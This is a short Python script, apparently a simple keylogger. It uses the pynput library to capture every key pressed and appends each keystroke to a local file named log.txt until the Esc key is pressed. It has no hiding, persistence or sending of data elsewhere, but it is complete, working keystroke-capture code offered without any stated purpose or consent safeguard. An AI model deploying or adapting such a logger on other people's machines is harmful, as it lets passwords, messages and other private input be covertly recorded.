#!/usr/bin/env python3

from pynput import keyboard

def on_press(keystroke):
    inputkeys = []
    inputkeys.append(keystroke)

    #write each keystroke in array to log.txt
    #a+ creates file if doesn't exist
    for i in inputkeys:
        with open("log.txt", "a+") as f:
            f.write(str(i))

def on_release(key):
#This function exists to have an escape character
#to gracefully end script
    if str(key) == 'Key.esc':
        return False

if __name__ == '__main__':
    with keyboard.Listener(
        on_press = on_press,
        on_release = on_release) as listener:
        listener.join() 
